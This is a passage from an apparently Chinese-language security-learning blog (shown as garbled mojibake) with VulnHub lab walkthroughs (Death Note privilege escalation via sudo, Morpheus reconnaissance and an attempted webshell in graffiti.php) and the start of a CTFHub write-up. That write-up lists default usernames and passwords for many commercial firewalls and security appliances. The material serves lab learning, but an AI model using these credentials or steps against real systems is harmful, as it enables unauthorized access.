src="/2022/08/29/vulnhub/image-20221108223847293.png" alt="image-20221108223847293"></p><blockquote><p>passwd : <code>kiraisevil</code> </p></blockquote><p>å¾—åˆ°<code>kira</code>å¯†ç </p><p>æˆ‘ä»¬ç›´æ¥ç™»å½•</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">su kira</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221108223953100.png" alt="image-20221108223953100"></p><p> ç™»å½•æˆåŠŸ</p><h2 id="4-ææƒ-1"><a href="#4-ææƒ-1" class="headerlink" title="4.ææƒ"></a>4.ææƒ</h2><p>æˆ‘ä»¬å…ˆçœ‹çœ‹<code>kira</code>èƒ½ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œå“ªäº›å‘½ä»¤</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221108224111044.png" alt="image-20221108224111044"></p><p>å¥½å®¶ä¼™</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">ALL</span> : <span class="type">ALL</span>) <span class="keyword">ALL</span></span><br></pre></td></tr></table></figure><p>ä»£è¡¨ä»–å¯ä»¥ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œä¸€åˆ‡å‘½ä»¤ï¼Œé‚£ä»–å°±ç›¸å½“äºç®¡ç†å‘˜äº†</p><p>æ‰§è¡Œ</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo su</span> </span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221108224357240.png" alt="image-20221108224357240"></p><p>ç›´æ¥æ— å¯†ç è¿›å…¥ç®¡ç†å‘˜ç”¨æˆ·</p><p>ç„¶åæŸ¥çœ‹åˆ°æ ¹ç›®å½•æŸ¥çœ‹<code>flag</code></p><p><img src="/2022/08/29/vulnhub/image-20221108224501582.png" alt="image-20221108224501582"></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">      ::::::::       ::::::::       ::::    :::       ::::::::       :::::::::           :::    :::::::::::       :::::::: </span><br><span class="line">    :+:    :+:     :+:    :+:      :+:+:   :+:      :+:    :+:      :+:    :+:        :+: :+:      :+:          :+:    :+: </span><br><span class="line">   +:+            +:+    +:+      :+:+:+  +:+      +:+             +:+    +:+       +:+   +:+     +:+          +:+         </span><br><span class="line">  +#+            +#+    +:+      +#+ +:+ +#+      :#:             +#++:++#:       +#++:++#++:    +#+          +#++:++#++   </span><br><span class="line"> +#+            +#+    +#+      +#+  +#+#+#      +#+   +#+#      +#+    +#+      +#+     +#+    +#+                 +#+    </span><br><span class="line">#+#    #+#     #+#    #+#      #+#   #+#+#      #+#    #+#      #+#    #+#      #+#     #+#    #+#          #+#    #+#     </span><br><span class="line">########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########       </span><br><span class="line"></span><br><span class="line">##########follow me on twitter###########<span class="number">3</span></span><br><span class="line">and share this screen shot and tag @KDSAMF</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>æ¸¸æˆç»“æŸ</strong></p><hr><h2 id="p-s-é¶æœºå½©è›‹"><a href="#p-s-é¶æœºå½©è›‹" class="headerlink" title="p.s.é¶æœºå½©è›‹"></a>p.s.é¶æœºå½©è›‹</h2><p>ä¹‹å‰æˆ‘ä»¬ä»¥<code>L</code>çš„èº«ä»½æŸ¥çœ‹<code>kira</code>ï¼Œå‘ç°ä»–åº•ä¸‹æœ‰ä¸ª<code>kira.txt</code>æ–‡æœ¬æ–‡ä»¶ï¼Œæˆ‘ä»¬æ— æƒè®¿é—®</p><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥è®¿é—®çœ‹çœ‹</p><p><img src="/2022/08/29/vulnhub/image-20221108224728118.png" alt="image-20221108224728118"></p><p>å‘ç°æ˜¯ä¸€ä¸²<code>base64</code>åŠ ç å­—ç¬¦</p><p>è§£ç çœ‹çœ‹</p><p><img src="/2022/08/29/vulnhub/image-20221108224803164.png" alt="image-20221108224803164"></p><blockquote><p><code>please protect one of the following</code> </p><ol><li><p><code>L (/opt)</code></p></li><li><p><code>Misa (/var)</code></p></li></ol><p>  åªèƒ½é€‰å…¶ä¸€æ¥ä¿æŠ¤</p></blockquote><p><code>/opt</code>åº•ä¸‹çš„<code>L</code>ï¼Œæˆ‘ä»¬å·²ç»çœ‹è¿‡äº†</p><p>æˆ‘ä»¬çœ‹çœ‹<code>/var</code>ä¸‹çš„<code>Misa</code>æœ‰ä»€ä¹ˆ</p><p><img src="/2022/08/29/vulnhub/image-20221108225235107.png" alt="image-20221108225235107"></p><blockquote><p><code>it is toooo late for misa</code><br>#å¯¹ç±³æ²™è€Œè¨€ï¼Œå·²ç»å¤ªè¿Ÿäº†</p></blockquote><p>æ„Ÿå…´è¶£çš„æœ‹å‹å¯ä»¥å»çœ‹çœ‹<code>DEATH NOTE</code></p><hr><h1 id="äºŒã€MATRIX-BREAKOUTï¼š2-MORPHEUS-ä¸­çº§"><a href="#äºŒã€MATRIX-BREAKOUTï¼š2-MORPHEUS-ä¸­çº§" class="headerlink" title="äºŒã€MATRIX-BREAKOUTï¼š2 MORPHEUS[ä¸­çº§]"></a>äºŒã€MATRIX-BREAKOUTï¼š2 MORPHEUS[ä¸­çº§]</h1><p><strong>ã€ŠçŸ©é˜µçªç ´ã€‹:2 å¢¨è²æ–¯</strong></p><blockquote><p>æè¿°ï¼š<br><code>This is the second in the Matrix-Breakout series, subtitled Morpheus:1. Itâ€™s themed as a throwback to the first Matrix movie. You play Trinity, trying to investigate a computer on the Nebuchadnezzar that Cypher has locked everyone else out from, which holds the key to a mystery.</code><br><code>Difficulty: Medium-Hard</code></p><p>è¿™æ˜¯ Matrix-Breakout ç³»åˆ—ä¸­çš„ç¬¬äºŒéƒ¨ï¼Œå‰¯æ ‡é¢˜ä¸º Morpheus:1ã€‚å®ƒçš„ä¸»é¢˜æ˜¯å›å½’ç¬¬ä¸€éƒ¨ Matrix ç”µå½±ã€‚æ‚¨æ‰®æ¼” Trinityï¼Œè¯•å›¾è°ƒæŸ¥ Nebuchadnezzar ä¸Šçš„ä¸€å°è®¡ç®—æœºï¼ŒCypher å·²å°†å…¶ä»–äººæ‹’ä¹‹é—¨å¤–ï¼Œè€Œè¿™å°è®¡ç®—æœºæŒæ¡ç€è§£å¼€è°œå›¢çš„é’¥åŒ™ã€‚<br>éš¾åº¦ï¼šä¸­ç­‰éš¾åº¦</p></blockquote><p><img src="https://i0.wp.com/xnfood.com.tw/wp-content/uploads/20211012094553_22.jpeg" alt="æ‡¶äººåŒ…ã€‹ã€é§­å®¢ä»»å‹™ã€ç³»åˆ—é›»å½±å›é¡§ï¼Œ1 ~ 4 é›†è©³ç´°åŠ‡æƒ…ã€å¿ƒå¾— ..."></p><blockquote><p>wcç¡®å®æœ‰ä¸œè¥¿<br>å®åœ¨ä¸æ‡‚å¯ä»¥çœ‹è¿™ä¸ªç ”è®¨ä¼šè§†é¢‘<br><code>https://www.beyondtrust.com/webinars/attacking-and-defending-linux-breaking-out-of-the-matrix-edition#video-container</code><br>è™½ç„¶è¿™ä¸ªä¸æ˜¯è¿™ä¸ªé¶æœºçš„wpï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯ä»å…¶ä¸­è·å¾—å¾ˆå¤šæ€è·¯</p></blockquote><h2 id="ä¿¡æ¯æ”¶é›†-10"><a href="#ä¿¡æ¯æ”¶é›†-10" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å…ˆæ‰«æä¸€ä¸‹ç«¯å£</p><p><img src="/2022/08/29/vulnhub/image-20221117130716527.png" alt="image-20221117130716527"></p><blockquote><p>å‘ç°<code>22</code>ç«¯å£å¼€æ”¾ï¼Œè¿è¡Œç€<code>ssh</code><br><code>80ï¼Œ81</code>ä¸¤ä¸ªç«¯å£éƒ½è¿è¡Œç€<code>http</code><br>ä½†æ˜¯ä¸¤è€…åå­—ä¸åŒï¼Œå¯ä»¥åˆ¤æ–­å‡º<br>ä½†æ˜¯80ç«¯å£å¯ä»¥ä»»æ„è®¿é—®ï¼Œ<code>81</code>ç«¯å£è®¿é—®éœ€è¦ä¸€å®šæƒé™</p></blockquote><p><img src="/2022/08/29/vulnhub/image-20221117134302741.png" alt="image-20221117134302741"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‘ç°81ç«¯å£æ˜¯éœ€è¦ç™»å½•çš„</span><br></pre></td></tr></table></figure><p>ç„¶å<code>dirsearch</code>æ‰«ä¸€ä¸‹ç›®å½•</p><p><img src="/2022/08/29/vulnhub/image-20221117130822881.png" alt="image-20221117130822881"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‘ç°ç½‘ç«™ç›®å½•ä¸‹æœ‰çˆ¬è™«åè®®ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®çœ‹çœ‹å…¶ä¸­æœ‰æ²¡æœ‰å…³é”®ä¿¡æ¯</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221117131146601.png" alt="image-20221117131146601"></p><blockquote><p><code>There&#39;s no white rabbit here.  Keep searching!</code><br>æ„æ€æ˜¯ï¼šè¿™é‡Œæ²¡æœ‰ç™½å…”ã€‚ç»§ç»­æœç´¢ï¼ </p><p>#<code>white rabbit</code>å°±æ˜¯çˆ±ä¸½ä¸æ¢¦æ¸¸ä»™å¢ƒé‡Œçš„ï¼Œè·Ÿç€ç™½è‰²çš„å…”å­ï¼Œæ‰è¿›å…”å­æ´</p><p>çœ‹æ¥æ˜¯æœ‰ä¸ªå¼•å¯¼çš„ä¿¡æ¯ï¼Œä¼šå¸¦æˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªå¾ˆå…³é”®çš„ä¸œè¥¿</p></blockquote><p>å†ç”¨<code>whatweb</code>æŸ¥çœ‹ç½‘ç«™å¯æ˜¾ç¤ºçš„æ¡†æ¶</p><p><img src="/2022/08/29/vulnhub/image-20221117131950416.png" alt="image-20221117131950416"></p><p>æ²¡æœ‰å•¥ä¿¡æ¯</p><p>æˆ‘ä»¬è®¿é—®ç½‘ç«™çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–ä¿¡æ¯</p><p><img src="/2022/08/29/vulnhub/image-20221117131405964.png" alt="image-20221117131405964"></p><blockquote><p><code>Welcome to the Boot2Root CTF, Morpheus:1.</code></p><p><code>You play Trinity, trying to investigate a computer on the Nebuchadnezzar that Cypher has locked everyone else out of, at least for ssh.</code></p><p><code>Good luck! - @jaybeale from @inguardians</code><br>æ„æ€æ˜¯ï¼š<br>æ¬¢è¿æ¥åˆ°Boot2Root CTFï¼Œå¢¨è²æ–¯:1.</p><p>ä½ æ‰®æ¼”<code>Trinity</code>ï¼Œè¯•å›¾è°ƒæŸ¥å°¼å¸ƒç”²å°¼æ’’åŠå²›ä¸Šçš„ä¸€å°ç”µè„‘ï¼Œ<code>Cypher</code>æŠŠæ‰€æœ‰äººéƒ½é”åœ¨å¤–é¢ï¼Œè‡³å°‘å¯¹äº<code>ssh</code>ã€‚</p><p>ç¥ä½ å¥½è¿ï¼ -@jaybealefrom@inguardians </p><p>#Cypherç”µå½±ä¸­åæŠ—ç»„ç»‡çš„ä¸€ä¸ªå›å¾’ï¼Œä»–æŠŠåæŠ—ç»„ç»‡é”åœ¨é—¨å¤–ï¼Œæˆ‘ä»¬åˆè¦ç”¨åˆ°ssh<br>é‚£çœ‹æ¥sshç™»å½•çš„ç”¨æˆ·åä¸ºCypher</p></blockquote><p>ä¿¡æ¯è¿˜æ˜¯å¤ªå°‘äº†ï¼Œ<code>dirsearch</code>åªæ‰«åˆ°ä¸¤ä¸ªå¯ä»¥è®¿é—®ï¼Œå®åœ¨åˆ©ç”¨å¤ªå°‘</p><p>æ‰€ä»¥æˆ‘ä»¬æ¢ä¸ªæ‰«æå·¥å…·</p><h3 id="dirbuster"><a href="#dirbuster" class="headerlink" title="dirbuster"></a>dirbuster</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DirBusteræ”¯æŒå…¨éƒ¨çš„Webç›®å½•æ‰«ææ–¹å¼ï¼Œç”¨æ¥æ¢æµ‹webæœåŠ¡å™¨ä¸Šçš„ç›®å½•å’Œéšè—æ–‡ä»¶</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘åˆ©ç”¨çš„æ˜¯</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/dirbuster/</span>wordlists/</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221119232447671.png" alt="image-20221119232447671"></p><p>æˆ‘é€šè¿‡<code>dirbuster</code>å·¥å…·æ‰«æåˆ°</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>/graffiti.php</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221119232601421.png" alt="image-20221119232601421"></p><p>è®¿é—®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>/graffiti.php</span><br></pre></td></tr></table></figure><p><img src="/2022/08/29/vulnhub/image-20221119234606473.png" alt="image-20221119234606473"></p><p>å‘ç°æ˜¯ä¸ªç•™è¨€ä¿¡æ¯çš„ä¸€ä¸ªç½‘ç«™</p><p>è€Œä¸”æˆ‘ä»¬è¯„è®ºçš„ä¿¡æ¯è¢«åŒ…å«åœ¨äº†<code>graffiti.php</code>æ–‡ä»¶ä¸­</p><p>æ‰€ä»¥æˆ‘çš„å¼€å§‹æ€è·¯æ˜¯åŒ…å«ä¸€å¥è¯ğŸ</p><p>ä½†æ˜¯æ’å…¥å¸¸è§„çš„<code>php</code>ğŸï¼Œä¼šè¢«ç ´å</p><p><img src="/2022/08/29/vulnhub/image-20221119234929786.png" alt="image-20221119234929786"></p><p>æ•…æˆ‘ä»¬æ’å…¥<code>jsp</code>ä¸€å¥è¯ğŸè¯•è¯•</p><p><img src="/2022/08/29/vulnhub/image-20221119235019960.png" alt="image-20221119235019960"></p><p>å‘ç°æ’å…¥æˆåŠŸï¼Œä½†æ˜¯ä¸çŸ¥é“èƒ½ä¸èƒ½è¿ä¸Š</p><p>ç”¨èšå‰‘è¯•è¯•</p><p>ä½†å…¶å®æ˜¯è¿ä¸ä¸Šçš„ï¼Œ</p><p>åé¢æˆ‘åˆè¯•äº†è¯•<code>xss</code>ï¼Œè™½ç„¶æœ‰å¼¹çª—ä½†æ˜¯æ²¡å•¥ç”¨ï¼Œä¹Ÿæ˜¯ä¸è¡Œ</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHub-wp</title>
      <link href="/2022/07/27/CTFHub-wp/"/>
      <url>/2022/07/27/CTFHub-wp/</url>
      
        <content type="html"><![CDATA[<p><code>åšåšç¬”è®°</code></p><span id="more"></span><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="1-å¯†ç å£ä»¤"><a href="#1-å¯†ç å£ä»¤" class="headerlink" title="1.å¯†ç å£ä»¤"></a>1.å¯†ç å£ä»¤</h2><h3 id="1ï¼‰å¼±å£ä»¤"><a href="#1ï¼‰å¼±å£ä»¤" class="headerlink" title="1ï¼‰å¼±å£ä»¤"></a>1ï¼‰å¼±å£ä»¤</h3><p>ä¸€èˆ¬æ€ç»´ï¼Œ</p><p>ç”¨æˆ·åï¼šadminï¼Œroot</p><p>å¯†ç ï¼špasswordï¼Œadmin123ï¼Œ123456</p><p>å¯ä»¥ç”¨<strong>top100å­—å…¸</strong>ï¼ˆå¯ä»¥ç½‘ä¸Šæ‰¾ä¸€ä¸‹ï¼‰è·‘ä¸€ä¸‹ï¼Œä½†æœ‰çš„å¯èƒ½éœ€è¦<strong>æšä¸¾æ³•</strong></p><p>æ¯”å¦‚<strong>admin888</strong>æˆ–è€…<strong>admin255</strong>è¿™æ ·çš„ç±»ä¼¼çš„ï¼Œå°±éœ€è¦åœ¨åé¢ç”¨æšä¸¾æ³•æ‰¾å‡ºï¼Œå­—å…¸å¹¶æ²¡åŒ…å«è¿™ç§ç±»ä¼¼æƒ…å†µ</p><h3 id="2ï¼‰é»˜è®¤å£ä»¤"><a href="#2ï¼‰é»˜è®¤å£ä»¤" class="headerlink" title="2ï¼‰é»˜è®¤å£ä»¤"></a>2ï¼‰é»˜è®¤å£ä»¤</h3><p>å°±æ˜¯ç³»ç»Ÿé»˜è®¤çš„å£ä»¤ï¼Œåœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæœ€å¸¸è§çš„æƒ…å†µå°±æ˜¯é‡åˆ°å¼±å£ä»¤å¾—åˆ°å…¥å£ä»è€Œæ”»é™·æ•´ä¸ªç³»ç»Ÿï¼Œç”±äºå¾ˆå¤šç³»ç»Ÿç®¡ç†å‘˜ç¼ºå°‘å®‰å…¨æ„è¯†ï¼Œå£ä»¤å¾€å¾€æ˜¯ç³»ç»Ÿé»˜è®¤è®¾ç½®çš„å£ä»¤</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">å¸¸è§ç½‘ç»œå®‰å…¨è®¾å¤‡å¼±å£ä»¤(é»˜è®¤å£ä»¤)</span><br><span class="line">è®¾å¤‡    é»˜è®¤è´¦å·    é»˜è®¤å¯†ç </span><br><span class="line">æ·±ä¿¡æœäº§å“    sangfor    sangfor sangfor@<span class="number">2018</span> sangfor@<span class="number">2019</span></span><br><span class="line">æ·±ä¿¡æœç§‘æŠ€â€‚AD        dlanrecover</span><br><span class="line">æ·±ä¿¡æœè´Ÿè½½å‡è¡¡ AD <span class="number">3.6</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">æ·±ä¿¡æœWAC ( WNS V2<span class="number">.6</span>)    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">æ·±ä¿¡æœVPN    <span class="keyword">Admin</span>    <span class="keyword">Admin</span></span><br><span class="line">æ·±ä¿¡æœipsec-VPN (SSL <span class="number">5.5</span>)    <span class="keyword">Admin</span>    <span class="keyword">Admin</span></span><br><span class="line">æ·±ä¿¡æœAC6<span class="number">.0</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">SANGFORé˜²ç«å¢™    <span class="keyword">admin</span>    sangfor</span><br><span class="line">æ·±ä¿¡æœAF(NGAF V2<span class="number">.2</span>)    <span class="keyword">admin</span>    sangfor</span><br><span class="line">æ·±ä¿¡æœNGAFä¸‹ä¸€ä»£åº”ç”¨é˜²ç«å¢™(NGAF V4<span class="number">.3</span>)    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">æ·±ä¿¡æœAD3<span class="number">.9</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">æ·±ä¿¡æœä¸Šç½‘è¡Œä¸ºç®¡ç†è®¾å¤‡æ•°æ®ä¸­å¿ƒ    <span class="keyword">Admin</span>    å¯†ç ä¸ºç©º</span><br><span class="line">SANGFOR_AD_v5<span class="number">.1</span>    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">ç½‘å¾¡æ¼æ´æ‰«æç³»ç»Ÿ    leadsec    leadsec</span><br><span class="line">å¤©é˜—å…¥ä¾µæ£€æµ‹ä¸ç®¡ç†ç³»ç»Ÿ V7<span class="number">.0</span>    <span class="keyword">Admin</span>    venus70</span><br><span class="line">Audit    venus70</span><br><span class="line">adm    venus70</span><br><span class="line">å¤©é˜—å…¥ä¾µæ£€æµ‹ä¸ç®¡ç†ç³»ç»Ÿ V6<span class="number">.0</span>    <span class="keyword">Admin</span>    venus60</span><br><span class="line">Audit    venus60</span><br><span class="line">adm    venus60</span><br><span class="line">ç½‘å¾¡WAFé›†ä¸­æ§åˆ¶ä¸­å¿ƒ(V3<span class="number">.0</span>R5<span class="number">.0</span>)    <span class="keyword">admin</span>    leadsec.waf</span><br><span class="line">audit    leadsec.waf</span><br><span class="line">adm    leadsec.waf</span><br><span class="line">è”æƒ³ç½‘å¾¡    administrator    administrator</span><br><span class="line">ç½‘å¾¡äº‹ä»¶æœåŠ¡å™¨    <span class="keyword">admin</span>    admin123</span><br><span class="line">è”æƒ³ç½‘å¾¡é˜²ç«å¢™PowerV    administrator    administrator</span><br><span class="line">è”æƒ³ç½‘å¾¡å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ    lenovo    <span class="keyword">default</span></span><br><span class="line">ç½‘ç»œå«å£«å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ    <span class="keyword">admin</span>    talent</span><br><span class="line">ç½‘å¾¡å…¥ä¾µæ£€æµ‹ç³»ç»ŸV3<span class="number">.2</span><span class="number">.72</span><span class="number">.0</span>    adm    leadsec32</span><br><span class="line"><span class="keyword">admin</span>    leadsec32</span><br><span class="line">è”æƒ³ç½‘å¾¡å…¥ä¾µæ£€æµ‹ç³»ç»ŸIDS    root    <span class="number">111111</span></span><br><span class="line"><span class="keyword">admin</span>    admin123</span><br><span class="line">ç§‘æ¥ç½‘ç»œå›æº¯åˆ†æç³»ç»Ÿ    csadmin    colasoft</span><br><span class="line">ä¸­æ§è€ƒå‹¤æœºweb3<span class="number">.0</span>    administrator    <span class="number">123456</span></span><br><span class="line">H3C iMC    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">H3C SecPathç³»åˆ—    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">H3C S5120-SI    test    <span class="number">123</span></span><br><span class="line">H3Cæ™ºèƒ½ç®¡ç†ä¸­å¿ƒ    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">H3C ER3100    <span class="keyword">admin</span>    adminer3100</span><br><span class="line">H3C ER3200    <span class="keyword">admin</span>    adminer3200</span><br><span class="line">H3C ER3260    <span class="keyword">admin</span>    adminer3260</span><br><span class="line">H3C    <span class="keyword">admin</span>    adminer</span><br><span class="line"><span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">admin</span>    h3capadmin</span><br><span class="line">h3c    h3c</span><br><span class="line"><span class="number">360</span>å¤©æ“    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">ç½‘ç¥é˜²ç«å¢™    firewall    firewall</span><br><span class="line">å¤©èä¿¡é˜²ç«å¢™NGFW4000    superman    talent</span><br><span class="line">é»‘ç›¾é˜²ç«å¢™    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">rule</span>    abc123</span><br><span class="line">audit    abc123</span><br><span class="line">åä¸ºé˜²ç«å¢™    telnetuser    telnetpwd</span><br><span class="line">ftpuser    ftppwd</span><br><span class="line">æ–¹æ­£é˜²ç«å¢™    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">é£å¡”é˜²ç«å¢™    <span class="keyword">admin</span>    å¯†ç ä¸ºç©º</span><br><span class="line">Juniper_SSG__5é˜²ç«å¢™    netscreen    netscreen</span><br><span class="line">ä¸­æ–°é‡‘ç›¾ç¡¬ä»¶é˜²ç«å¢™    <span class="keyword">admin</span>    <span class="number">123</span></span><br><span class="line">killé˜²ç«å¢™(å† ç¾¤é‡‘è¾°)    <span class="keyword">admin</span>    sys123</span><br><span class="line">å¤©æ¸…æ±‰é©¬USGé˜²ç«å¢™    <span class="keyword">admin</span>    venus.fw</span><br><span class="line">Audit    venus.audit</span><br><span class="line">useradmin    venus.<span class="keyword">user</span></span><br><span class="line">é˜¿å§†ç‘ç‰¹é˜²ç«å¢™    <span class="keyword">admin</span>    manager</span><br><span class="line">å±±çŸ³ç½‘ç§‘    hillstone    hillstone</span><br><span class="line">ç»¿ç›Ÿå®‰å…¨å®¡è®¡ç³»ç»Ÿ    weboper    weboper</span><br><span class="line">webaudit    webaudit</span><br><span class="line">conadmin    conadmin</span><br><span class="line"><span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line">shell    shell</span><br><span class="line">ç»¿ç›Ÿäº§å“        nsfocus123</span><br><span class="line">TopAuditæ—¥å¿—å®¡è®¡ç³»ç»Ÿ    superman    talent</span><br><span class="line">LogBaseæ—¥å¿—ç®¡ç†ç»¼åˆå®¡è®¡ç³»ç»Ÿ    <span class="keyword">admin</span>    safetybase</span><br><span class="line">ç½‘ç¥SecFoxè¿ç»´å®‰å…¨ç®¡ç†ä¸å®¡è®¡ç³»ç»Ÿ    <span class="keyword">admin</span>    !<span class="number">1</span>fw@<span class="number">2</span>soc#<span class="number">3</span>vpn</span><br><span class="line">å¤©èä¿¡æ•°æ®åº“å®¡è®¡ç³»ç»Ÿ    superman    telent</span><br><span class="line">Hillstoneå®‰å…¨å®¡è®¡å¹³å°    hillstone    hillstone</span><br><span class="line">ç½‘åº·æ—¥å¿—ä¸­å¿ƒ    ns25000    ns25000</span><br><span class="line">ç½‘ç»œå®‰å…¨å®¡è®¡ç³»ç»Ÿï¼ˆä¸­ç§‘æ–°ä¸šï¼‰    <span class="keyword">admin</span>    <span class="number">123456</span></span><br><span class="line">å¤©ç¥ç½‘ç»œå®‰å…¨å®¡è®¡ç³»ç»Ÿ    <span class="keyword">Admin</span>    cyberaudit</span><br><span class="line">æ˜å¾¡WEBåº”ç”¨é˜²ç«å¢™    <span class="keyword">admin</span>    <span class="keyword">admin</span></span><br><span class="line"><span class="keyword">admin</span>    adminadmin</span><br><span class="line">æ˜å¾¡æ”»é˜²å®éªŒå®¤å¹³å°    root    <span class="number">123456</span></span><br><span class="line">æ˜å¾¡å®‰å…¨ç½‘å…³    <span class="keyword">admin</span>    adminadmin</span><br><span class="line">æ˜å¾¡è¿ç»´å®¡è®¡ä¸å†Œé£é™©æ§åˆ¶ç³»ç»Ÿ    <span class="keyword">admin</span>    <span class="number">1</span>q2w3e</span><br><span class="line"><span class="keyword">system</span>    <span class="number">1</span>q2w3e4r</span><br><span class="line">auditor    <span class="number">1</span>q2w3e</span><br><span class="line"><span class="keyword">operator</span>    <span class="number">1</span>q2w3e4r</span><br><span class="line">æ˜å¾¡ç½‘ç«™å«å£«    sysmanager    sysmanager888</span><br><span class="line">äº¿é‚®é‚®ä»¶ç½‘å…³    eyouuser    eyou_admin</span><br><span class="line">eyougw    <span class="keyword">admin</span>@(eyou)</span><br><span class="line"><span class="keyword">admin</span>    +-ccccc</span><br><span class="line"><span class="keyword">admin</span>    cyouadmin</span><br><span class="line">Websenseé‚®ä»¶å®‰å…¨ç½‘å…³    administrator    <span 